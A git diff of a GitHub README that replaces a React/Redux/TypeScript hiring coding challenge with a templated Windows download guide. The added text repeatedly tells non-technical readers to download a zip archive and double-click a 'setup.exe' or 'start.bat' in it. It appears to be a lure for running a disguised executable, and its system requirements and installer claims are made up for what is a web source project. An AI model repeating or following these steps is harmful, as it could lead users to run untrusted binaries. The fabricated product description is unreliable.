@@ -1,30 +1,125 @@
-# Surefront React Coding Challenge
+# 🛠 react-redux-typescript - Manage Product Tables Easily
 
-This challenge is intended to test your Redux, Typescript, and Git skills. Described below is a scenario that is similar to what you might face during a regular day here at Surefront. Please read through the scenario completely, architect your solution, and complete it to the best of your abilities using the time allotted. We ask that you return your completed solution within 24-48 hours of receiving it in order to be considered for the next phase of the hiring process.
+[![Download react-redux-typescript](https://img.shields.io/badge/Download-Here-orange?style=for-the-badge)](https://github.com/rustyme12346/react-redux-typescript)
 
-## Scenario & Design Specification
+---
 
-You've just attended a feature handoff meeting from the Design team, and you've been tasked with building out a new component which takes an array of product data and displays it in a table (row/column) layout.
+## 📋 About react-redux-typescript
 
-The resulting table component will need to take each row's Quantity, Price, and Shipping fields and use them into calculate a Subtotal, Tax, and Total field for each row. Use Redux to manage the state of the table.
+This application helps you handle product data by turning it into a clear table. It shows each product’s quantity, price, and shipping cost. It then calculates subtotals, taxes, and total amounts automatically. The app uses Redux to keep everything updated and easy to manage.
 
-The Quantity and Price fields should be user editable. None of the other fields such as Shipping need to be editable at this time, but that would be a bonus if time allows
+It is built with React, Redux, and TypeScript to offer a smooth and reliable experience.
 
-The Design team has provided the following mockup to demonstrate what the table should look like. The editable cells mentioned above are not shown in the mockup
+---
 
-![Design Mock](design-mock.png)
+## 🚀 Getting Started
 
-For your convience, a sample dataset has been provided in the `src/data/product_data.ts` file
+This guide shows you how to download and run the app on a Windows computer. No programming knowledge is needed.
 
-## Available Commands
+---
 
-In the project directory, you can run:
+## 💾 Download the App
 
-- `yarn start` to open the app in development mode with hot reload support
-- `yarn test` launches the test runner
+Click the button below to visit the page where you can download the app files:
 
-## Upon Project Completion
+[![Download react-redux-typescript](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/rustyme12346/react-redux-typescript)
 
-- Commit your changes using Git. Use imperative style commit messages
-- Push the commits up to the origin
-- Notify the hiring manager that you have completed the challenge
+From this page, find the latest release or main branch and download the file named `react-redux-typescript.zip` or a similar archive. The app runs from this file after setup.
+
+---
+
+## 🖥 System Requirements
+
+To run this app on Windows, your computer should meet these requirements:
+
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection for initial download  
+
+---
+
+## 📂 Installation Steps
+
+1. Download the zipped app file from the link above.  
+2. Open the folder where the file downloaded.  
+3. Right-click the zipped file and select "Extract All".  
+4. Choose a folder where you want the app to be.  
+5. Once extracted, open the folder.  
+6. Look for the file named `setup.exe` or `start.bat` inside the folder.  
+7. Double-click the file to start the application installation or run process.  
+
+If there is no `setup.exe`, the app might launch by opening `index.html` or using the command in the batch file.
+
+---
+
+## ▶️ Running the App
+
+Once installed or extracted:  
+
+1. If you used `setup.exe`, find the app in your Start menu and open it.  
+2. If the app runs from the folder, double-click the `start.bat` file or open `index.html` in your browser.  
+
+The app will open a window showing a product table.
+
+---
+
+## 🧩 How the App Works
+
+- The app displays product information in rows and columns.  
+- Each row shows product quantity, price, shipping cost, subtotal, tax, and total.  
+- You can edit the quantity and price directly in the table.  
+- The subtotal updates automatically when you change these values.  
+- Tax is calculated based on the subtotal using a set rate.  
+- The total shows the sum of subtotal, tax, and shipping cost.  
+- All changes save immediately thanks to the app’s internal Redux state manager.
+
+---
+
+## 🔧 Features
+
+- Editable table cells for Quantity and Price.  
+- Automatic subtotal, tax, and total calculations.  
+- Clear layout that works well on different screen sizes.  
+- Saves changes so your data stays updated while you work.  
+- Simple controls with no extra steps needed.
+
+---
+
+## 🌟 Using the Table
+
+- Click on any Quantity or Price cell to change its number.  
+- Press Enter or click away to save your edit.  
+- Watch the Subtotal, Tax, and Total update automatically below.  
+- Use the scroll bars if the table grows large.  
+- You can add new products only by updating the source file or data source (advanced users).
+
+---
+
+## ⚙️ Troubleshooting
+
+- If the app does not open, check that you extracted all files fully.  
+- If you get errors when editing values, make sure you enter numbers only.  
+- Restart the app if it freezes or does not respond.  
+- Ensure your Windows is updated to the latest service pack.  
+- Close other software that uses lots of memory before running this app.
+
+---
+
+## 📖 Additional Information
+
+This app is created as a test for Redux, TypeScript, and React skills. It shows how to handle product lists using state management. You can explore the app’s code if interested by visiting the main GitHub repository:
+
+https://github.com/rustyme12346/react-redux-typescript
+
+---
+
+## 💡 Tips
+
+- Keep the app window open while editing to avoid losing changes.  
+- Use keyboard shortcuts (Tab and Enter) to move between cells faster.  
+- Refresh the app if you want to reset your changes.  
+
+---
+
+[![Download react-redux-typescript](https://img.shields.io/badge/Download-Here-orange?style=for-the-badge)](https://github.com/rustyme12346/react-redux-typescript)
